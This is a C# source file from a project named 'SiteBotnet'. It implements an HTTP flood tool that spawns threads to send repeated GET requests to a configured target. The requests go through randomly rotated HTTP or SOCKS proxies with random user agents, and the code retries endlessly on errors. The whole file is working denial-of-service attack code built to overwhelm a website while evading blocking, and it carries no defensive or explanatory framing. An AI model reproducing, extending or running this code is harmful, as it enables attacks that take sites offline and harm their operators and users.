using System;
using Leaf.xNet;
using System.Threading;

namespace SiteBotnet
{
    public class Request
    {
        private string Name;
        private Thread Thread;
        private Random Random;

        private int hits;

        public Request(string name)
        {
            Name = name;
            Random = new Random();
        }

        public void Start()
        {
            Console.WriteLine("[" + Name + "] Starting");
            Thread = new Thread(Botnet) { Name = Name };
            Thread.Start();
        }

        private void Botnet()
        {
            request: try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    req.UserAgent = Http.RandomUserAgent();
                    req.ConnectTimeout = Reference.Timeout;

                    if (Reference.ProxyType != "NONE")
                    {
                        ProxyType type = ProxyType.HTTP;

                        if (Reference.ProxyType == "SOCKS4")
                            type = ProxyType.Socks4;
                        else if (Reference.ProxyType == "SOCKS5")
                            type = ProxyType.Socks5;

                        req.Proxy = ProxyClient.Parse(type, Reference.Proxies[Random.Next(Reference.Proxies.Length)]);
                    }

                    string url = Reference.Method.ToLower() + "://" + Reference.Target + ":" + Reference.Port;
                    
                    req.Get(url);

                    hits++;
                    Reference.Hits++;

                    Console.WriteLine("[" + Name + "] Sent request to " + url + " (" + hits + " hits)");
                }

                Start();
            } catch (Exception) { goto request; }
        }
    }
}
